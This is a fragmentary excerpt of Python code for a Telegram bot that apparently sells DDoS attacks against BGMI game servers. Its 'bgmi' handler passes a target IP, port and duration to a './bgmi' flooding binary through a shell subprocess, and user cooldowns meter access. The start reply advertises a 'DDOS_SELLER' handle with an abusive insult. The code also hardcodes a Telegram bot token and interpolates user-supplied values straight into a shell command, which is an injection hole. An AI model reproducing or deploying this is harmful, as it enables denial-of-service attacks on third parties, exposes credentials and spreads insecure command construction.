...
async def bgmi_command(message, bot):
    try:
        ...
        if message.from_user.id in user_cooldowns:
            ...
            remaining_time = cooldown_time - time.time()
            if remaining_time > 0:
               bot.send_message(message.chat.id, f', 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(remaining_time)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️')
               return
        ...
        cooldown_time = time.time() + user_duration
        ...
        command = f'./bgmi {target_ip} {target_port} {default_duration}'
        process = await create_subprocess_shell(command, stdout = asyncio.subprocess.PIPE, stderr = asyncio.subprocess.PIPE)
...
TOKEN = '8112121634:AAG6RBw5ORjMtp443YhmxsR5xAfVqoT4xdE'
...
def handle_start_help(message):
    bot.reply_to(message, ' | [ DON\'T BE OVERSMART @DDOS_SELLER_1 BAP HAI TUMHARA BKL ] |')
...
def handle_bgmi(message):
      asyncio.create_task(bgmi_command(message, bot))
...
if __name__ == '__main__':
    ...
    try:
      loop.create_task(none_stop(bot))
